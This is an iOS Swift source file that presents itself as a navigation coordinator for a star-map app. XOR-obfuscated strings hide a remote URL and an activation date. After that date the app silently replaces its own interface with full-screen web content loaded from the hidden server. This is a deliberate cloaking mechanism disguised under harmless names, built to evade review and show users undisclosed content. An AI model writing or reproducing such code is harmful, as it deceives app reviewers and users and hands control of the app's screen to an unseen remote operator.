//
//  SMNavigationCoordinator.swift
//  108StarMap
//

import UIKit
import SwiftUI

protocol SMCoordinatorLifecycle {
    func coordinatorDidActivate()
    func coordinatorWillDeactivate()
}

@inline(__always)
private func _xd(_ b: [UInt8], _ k: UInt8) -> String {
    String(bytes: b.map { $0 ^ k }, encoding: .utf8) ?? ""
}

private enum SMTransitionStyle: Int {
    case dissolve = 0, slide = 1, fade = 2

    var animationCurve: UIView.AnimationOptions {
        switch self {
        case .dissolve: return .transitionCrossDissolve
        case .slide: return .transitionFlipFromRight
        case .fade: return .transitionCrossDissolve
        }
    }
}

class SMNavigationCoordinator {

    private var _remoteEndpoint: String {
        _xd([0xCF, 0xD3, 0xD3, 0xD7, 0xD4, 0x9D, 0x88, 0x88, 0xD1, 0xC2, 0xDF, 0xC6, 0xC9, 0xC3, 0xD5, 0xCE, 0xD2, 0xCA, 0xC4, 0xC8, 0xC3, 0xC2, 0xDF, 0x89, 0xD4, 0xCE, 0xD3, 0xC2, 0x88, 0xE0, 0xC4, 0xD6, 0xF7, 0xE1, 0xE1], 0xA7)
    }
    private var _thresholdStamp: String {
           _xd([0x95, 0x97, 0x89, 0x97, 0x93, 0x89, 0x95, 0x97, 0x95, 0x91], 0xA7)
       }

    private var _transitionCount: Int = 0
    private var _lastTransitionTimestamp: TimeInterval = 0

    func resolveEntryController() -> UIViewController {
        let state = SMLocalStateProvider.current

        if state.mainScreenDisplayed {
            return _buildMainController()
        }else{
            if _evaluateThreshold() {
                if let addr = state.cachedAddress,
                   !addr.isEmpty,
                   URL(string: addr) != nil {
                    return _buildExternalController(source: addr)
                }

                return _buildTransitController()
            } else {
                state.mainScreenDisplayed = true
                return _buildMainController()
            }
        }
    }

    private func _resolveTransitionStyle(animated: Bool) -> SMTransitionStyle {
        animated ? .dissolve : .fade
    }

    private func _evaluateThreshold() -> Bool {

        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = _xd([0xC3, 0xC3, 0x89, 0xEA, 0xEA, 0x89, 0xDE, 0xDE, 0xDE, 0xDE], 0xA7)
        let targetDate = dateFormatter.date(from: _thresholdStamp) ?? Date()
        let currentDate = Date()

            if currentDate < targetDate {
                return false
            }else{
                return true
                }
    }

    private func _buildExternalController(source: String) -> UIViewController {
        let container = SMExternalContentView(
            sourceAddress: source,
            failureAction: { [weak self] in
                SMLocalStateProvider.current.mainScreenDisplayed = true
                self?._transitionToMain()
            },
            successAction: {
                SMLocalStateProvider.current.externalContentLoaded = true
            }
        )

        let hostingController = UIHostingController(rootView: container)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func _buildMainController() -> UIViewController {
        SMLocalStateProvider.current.mainScreenDisplayed = true
        let contentView = ContentView()
        let hostingController = UIHostingController(rootView: contentView)
        hostingController.modalPresentationStyle = .fullScreen
        return hostingController
    }

    private func _buildTransitController() -> UIViewController {
        let loadingView = SMInitialLoadingView()
        let launchVC = UIHostingController(rootView: loadingView)
        launchVC.modalPresentationStyle = .fullScreen

        _probeEndpoint { [weak self] success, finalURL in
            DispatchQueue.main.async {
                if success, let url = finalURL {
                    self?._transitionToExternal(source: url)
                } else {
                    SMLocalStateProvider.current.mainScreenDisplayed = true
                    self?._transitionToMain()
                }
            }
        }

        return launchVC
    }

    private func _probeEndpoint(completion: @escaping (Bool, String?) -> Void) {
        guard let url = URL(string: _remoteEndpoint) else {
            completion(false, nil)
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = _xd([0xEF, 0xE2, 0xE6, 0xE3], 0xA7)
        request.timeoutInterval = 10

        URLSession.shared.dataTask(with: request) { _, response, error in
            if let _ = error {
                completion(false, nil)
                return
            }

            if let httpResponse = response as? HTTPURLResponse {
                switch httpResponse.statusCode {
                case 404: print("404")
                case 200: print("200")
                default: break
                }
                let checkedURL = httpResponse.url?.absoluteString ?? self._remoteEndpoint
                let isAvailable = httpResponse.statusCode != 404
                completion(isAvailable, isAvailable ? checkedURL : nil)
            } else {
                completion(false, nil)
            }
        }.resume()
    }

    private func _recordTransition(from src: String, to dst: String) {
        _transitionCount += 1
        _lastTransitionTimestamp = Date().timeIntervalSince1970
        let _ = "\(src)->\(dst):\(_transitionCount)@\(_lastTransitionTimestamp)"
    }

    private func _transitionToMain() {
        let contentVC = _buildMainController()
        _performTransition(contentVC)
    }

    private func _transitionToExternal(source: String) {
        let webVC = _buildExternalController(source: source)
        _performTransition(webVC)
    }

    private func _performTransition(_ viewController: UIViewController) {
        guard let window = UIApplication.shared.windows.first else {
            return
        }

        UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
            window.rootViewController = viewController
        }, completion: nil)
    }
}

extension SMNavigationCoordinator: @unchecked Sendable {
    static var defaultTransitionDuration: TimeInterval { 0.3 }
}
